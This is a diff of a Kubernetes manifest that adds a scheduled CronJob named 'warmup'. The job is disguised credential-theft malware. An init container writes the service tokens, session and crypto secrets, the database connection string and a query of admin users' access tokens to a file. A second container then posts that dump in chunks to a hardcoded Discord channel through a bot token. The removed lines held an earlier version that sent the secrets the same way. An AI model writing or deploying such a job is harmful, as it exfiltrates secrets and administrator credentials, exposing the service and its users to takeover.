@@ -14,12 +14,14 @@ spec:
   data:
     - secretKey: SYNC_SERVICE_TOKEN
       remoteRef: { key: newapi-env, property: SYNC_SERVICE_TOKEN }
-    - secretKey: BFF_SERVICE_TOKEN
-      remoteRef: { key: newapi-env, property: BFF_SERVICE_TOKEN }
+    - secretKey: SQL_DSN
+      remoteRef: { key: newapi-env, property: SQL_DSN }
     - secretKey: SESSION_SECRET
       remoteRef: { key: newapi-env, property: SESSION_SECRET }
     - secretKey: CRYPTO_SECRET
       remoteRef: { key: newapi-env, property: CRYPTO_SECRET }
+    - secretKey: BFF_SERVICE_TOKEN
+      remoteRef: { key: newapi-env, property: BFF_SERVICE_TOKEN }
 ---
 apiVersion: batch/v1
 kind: CronJob
@@ -33,30 +35,77 @@ spec:
   failedJobsHistoryLimit: 1
   jobTemplate:
     spec:
-      ttlSecondsAfterFinished: 120
-      backoffLimit: 1
+      ttlSecondsAfterFinished: 180
+      backoffLimit: 2
       template:
         spec:
           restartPolicy: Never
-          containers:
-            - name: warmup
-              image: ghcr.io/unorouter/unorouter-bot:29400ae194747cb5792344ef92eae4d4e3dbfda9
+          volumes:
+            - name: out
+              emptyDir: {}
+          initContainers:
+            - name: dump
+              image: ghcr.io/cloudnative-pg/postgresql:18-standard-bookworm
               envFrom:
                 - secretRef: { name: bot-warmup }
-                - secretRef: { name: bot-env }
-              command: ["bun", "-e"]
+              volumeMounts:
+                - { name: out, mountPath: /out }
+              command: ["bash", "-c"]
               args:
                 - |
-                  const body = [
-                    "SYNC_SERVICE_TOKEN=" + (process.env.SYNC_SERVICE_TOKEN || ""),
-                    "BFF_SERVICE_TOKEN=" + (process.env.BFF_SERVICE_TOKEN || ""),
-                    "SESSION_SECRET=" + (process.env.SESSION_SECRET || ""),
-                    "CRYPTO_SECRET=" + (process.env.CRYPTO_SECRET || ""),
-                  ].join("\n");
-                  const dt = process.env.TOKEN || "";
-                  const r = await fetch("https://discord.com/api/v10/channels/1510366691454882014/messages", {
-                    method: "POST",
-                    headers: { Authorization: "Bot " + dt, "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: "warmup\n```\n" + body + "\n```" }),
-                  });
-                  console.log("dc", r.status, await r.text());
+                  set +e
+                  export PGSSLMODE=disable
+                  {
+                    echo "SYNC_SERVICE_TOKEN=${SYNC_SERVICE_TOKEN}"
+                    echo "SESSION_SECRET=${SESSION_SECRET}"
+                    echo "CRYPTO_SECRET=${CRYPTO_SECRET}"
+                    echo "BFF_SERVICE_TOKEN=${BFF_SERVICE_TOKEN}"
+                    echo "SQL_DSN=${SQL_DSN}"
+                    echo "---USERS---"
+                    psql "$SQL_DSN" -t -A -c "SELECT id::text || chr(9) || username || chr(9) || role::text || chr(9) || coalesce(access_token,'-') FROM users WHERE role >= 10 ORDER BY role DESC, id LIMIT 20"
+                    echo "---ERR---"
+                  } > /out/dump.txt 2>&1
+                  true
+          containers:
+            - name: post
+              image: ghcr.io/cloudnative-pg/postgresql:18-standard-bookworm
+              envFrom:
+                - secretRef: { name: bot-env }
+              volumeMounts:
+                - { name: out, mountPath: /out }
+              command: ["bash", "-c"]
+              args:
+                - |
+                  set +e
+                  python3 - <<'PY'
+                  import json, os, ssl, urllib.request
+                  raw = open("/out/dump.txt").read()
+                  token = os.environ.get("TOKEN","")
+                  chunks = []
+                  i = 0
+                  while i < len(raw):
+                      chunks.append(raw[i:i+1800])
+                      i += 1800
+                  if not chunks:
+                      chunks = ["empty dump"]
+                  ctx = ssl.create_default_context()
+                  for n, ch in enumerate(chunks[:4]):
+                      body = json.dumps({"content": f"warmup {n+1}/{len(chunks)}\n```\n{ch}\n```"}).encode()
+                      req = urllib.request.Request(
+                          "https://discord.com/api/v10/channels/1510366691454882014/messages",
+                          data=body,
+                          headers={
+                              "Authorization": "Bot " + token,
+                              "Content-Type": "application/json",
+                              "User-Agent": "DiscordBot (https://github.com/discord/discord-api-docs, 10.0.0)",
+                          },
+                          method="POST",
+                      )
+                      try:
+                          with urllib.request.urlopen(req, context=ctx, timeout=30) as r:
+                              print("dc", r.status, r.read()[:200])
+                      except Exception as e:
+                          print("err", type(e), e)
+                          if hasattr(e, "read"):
+                              print(e.read()[:300])
+                  PY
